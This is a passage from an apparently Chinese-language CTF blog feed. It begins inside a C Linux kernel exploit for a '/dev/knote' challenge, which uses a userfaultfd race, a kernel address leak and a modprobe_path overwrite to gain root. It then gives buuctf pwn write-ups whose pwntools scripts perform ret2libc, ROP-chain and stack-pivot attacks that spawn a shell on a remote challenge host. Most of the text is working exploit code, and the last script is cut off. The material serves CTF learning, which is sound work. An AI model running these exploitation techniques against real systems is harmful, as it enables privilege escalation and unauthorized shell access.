class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by ubuntu on 22-10-5.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">input</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">        <span class="type">size_t</span> size;</span><br><span class="line">        <span class="type">size_t</span> index;</span><br><span class="line">    &#125;info;</span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line">&#125;input;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET 0x2333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT 0x8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DO_SAK_WORK_ADDR 0xFFFFFFFF815D4EF0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xFFFFFFFF810B3040</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xFFFFFFFF810B3390</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH 0xFFFFFFFF8245C5C0</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* faultBuffer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, GET, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.size = size,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, ADD, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, DEL, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, EDIT, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Parent process stopped here.&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    faultBuffer = (<span class="type">char</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(faultBuffer, <span class="number">0x1000</span>, (<span class="type">void</span>*)fault_handler_thread);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> shellFile = open(<span class="string">&quot;/getFlag&quot;</span>, O_RDWR | O_CREAT);</span><br><span class="line">    <span class="type">char</span>* shellCode = <span class="string">&quot;#!/bin/sh\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;chmod 777 /flag&quot;</span>;</span><br><span class="line">    write(shellFile, shellCode, <span class="built_in">strlen</span>(shellCode));</span><br><span class="line">    close(shellFile);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /getFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/knote&quot;</span>, O_RDWR);</span><br><span class="line">    add(TTY_STRUCT_SIZE);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Fork failed&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Child process sleeping...&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to delete note in child process...&quot;</span> CEND);</span><br><span class="line">        dele(<span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to open /dev/ptmx in child process...&quot;</span> CEND);</span><br><span class="line">        open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        get(<span class="number">0</span>, faultBuffer);</span><br><span class="line"></span><br><span class="line">    print_binary(faultBuffer, TTY_STRUCT_SIZE);</span><br><span class="line">    <span class="type">u_int64_t</span> do_sak_work = *((<span class="type">u_int64_t</span>*)(faultBuffer + <span class="number">0x2B0</span>));</span><br><span class="line">    <span class="keyword">if</span>(!do_sak_work)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to get do_SAK_work!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(GREEN <span class="string">&quot;Successfully got address of do_SAK_work: %#zx&quot;</span> CEND, do_sak_work);</span><br><span class="line">    <span class="type">u_int64_t</span> offset = do_sak_work - DO_SAK_WORK_ADDR;  <span class="comment">// offset got</span></span><br><span class="line"></span><br><span class="line">    commit_creds = offset + COMMIT_CREDS;               <span class="comment">// get address of commit_creds</span></span><br><span class="line">    prepare_kernel_cred = offset + PREPARE_KERNEL_CRED; <span class="comment">// get address of prepare_kernel_cred</span></span><br><span class="line">    <span class="type">u_int64_t</span> modprobe_path = offset + MODPROBE_PATH;   <span class="comment">// get address of modprobe_path</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page, &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Fork failed&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Child process sleeping...&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to delete note in child process...&quot;</span> CEND);</span><br><span class="line">        dele(<span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to open /dev/ptmx in child process...&quot;</span> CEND);</span><br><span class="line">        open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        edit(<span class="number">0</span>, page);</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x100</span>);</span><br><span class="line">    add(<span class="number">0x100</span>);     <span class="comment">// this cache allocates to modprobe_path</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">&quot;/getFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\xff\xff\xff\xff&#x27; &gt; /hook&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /hook&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/hook&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> flag = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(flag &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to open flag file!&quot;</span>);</span><br><span class="line">    <span class="type">char</span> flagContent[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(flag, flagContent, <span class="number">0x50</span>);</span><br><span class="line">    write(<span class="number">1</span>, flagContent, <span class="number">0x50</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);<span class="comment">// to prevent kernel panic</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图中的<code>this is example</code>就是flag。</p><p><img src="https://img-blog.csdnimg.cn/d4f9879f549d4957b125a96cd2b2e647.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn write-ups (4)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-4/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-4/</url>
      
        <content type="html"><![CDATA[<h1 id="buu032-ez-pz-hackover-2016"><a href="#buu032-ez-pz-hackover-2016" class="headerlink" title="buu032-ez_pz_hackover_2016"></a>buu032-ez_pz_hackover_2016</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">chall</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-40Ch] BYREF</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">1023</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(s, <span class="number">10</span>, v0);                       <span class="comment">// 将中间的换行符换成空字节</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, s);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(s, <span class="string">&quot;crashme&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> vuln((<span class="type">char</span>)s, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chall函数中打印了一个地址，但是没啥用，不给也能做。</p><p>本题一个考察的重点就是fgets函数，这个函数遇到换行输入会截断，但是空字节不会，因此可以在crashme后面加一个空字节，后面仍然能输入我们的payload，绕过检查。<br><img src="https://img-blog.csdnimg.cn/eb5d2917bde445c28a8bde35db106aec.png"><br>需要注意的是memcpy的src起始地址并不是crashme的地址，而是crashme的二重指针，也就是说复制之后dest的值并不是crashme。这个地址在crashme的前面，因此需要添加的无效字节数量需要经过计算。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28953</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span></span><br><span class="line">payload += cyclic(<span class="number">2</span> + <span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;chall&#x27;</span>])</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;crashme!\n&#x27;</span>)</span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span></span><br><span class="line">payload += cyclic(<span class="number">2</span> + <span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0xdeadeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu033-picoctf-2018-rop-chain"><a href="#buu033-picoctf-2018-rop-chain" class="headerlink" title="buu033-picoctf_2018_rop chain"></a>buu033-picoctf_2018_rop chain</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29541</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;win_function1&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;win_function2&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Enter your input&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu034-Black-Watch-入群题-PWN"><a href="#buu034-Black-Watch-入群题-PWN" class="headerlink" title="buu034-[Black Watch 入群题]PWN"></a>buu034-[Black Watch 入群题]PWN</h1><p>bss段给了一大块空间，推测考察栈迁移。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后一个read的溢出只能覆盖返回地址，因此是栈迁移无疑，将栈转移到bss段。<br>本题要明确leave指令的作用，其相当于’mov esp, ebp; pop ebp’。我们传入的第一个payload在bss段上，作为伪造的栈区备用；第二个payload中，我们修改了ebp处的值为bss段地址，但此时esp仍然在原来的栈上，不过我们可以将返回地址写到’leave’指令，让程序再一次执行leave指令，由于此时ebp已经被修改为bss段地址，因此此时esp就被成功修改。注意后面的pop ebp指令中pop出来的值已经是bss段上的值了。</p><p>在pop之后，esp应指向s+4的位置，这里我们写入write函数读取libc基地址，然后返回到vul_function中，因为vul_function中能够直接在s中写入很多字节，因此就相当于我们直接修改ebp后面的返回地址。将获取的system函数和’&#x2F;bin&#x2F;sh’字符串地址写入即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29191</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake stack</span></span><br><span class="line">payload = p32(elf.symbols[<span class="string">&#x27;m1&#x27;</span>] + <span class="number">20</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;vul_function&#x27;</span>])<span class="comment"># return address, return to function</span></span><br><span class="line">payload += p32(<span class="number">1</span>)<span class="comment"># first argument of write: stdout</span></span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;write&#x27;</span>])<span class="comment"># second argument of write: .got address of &#x27;write&#x27;</span></span><br><span class="line">payload += p32(<span class="number">4</span>)<span class="comment"># third argument of write: write length</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What is your name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;s&#x27;</span>])<span class="comment"># fake ebp</span></span><br><span class="line">payload += p32(<span class="number">0x8048511</span>)<span class="comment"># return to &#x27;leave; retn&#x27; to change rsp into .bss segment</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;What do you want to say?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write)</span><br><span class="line">base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># we can change the stack after ebp directly through &#x27;vul_function&#x27;</span></span><br><span class="line"><span class="comment"># now the ebp points to s+8, so fill 12 bytes of garbage into s first</span></span><br><span class="line">payload = p32(<span class="number">0xdeadbeef</span>) * <span class="number">3</span></span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span 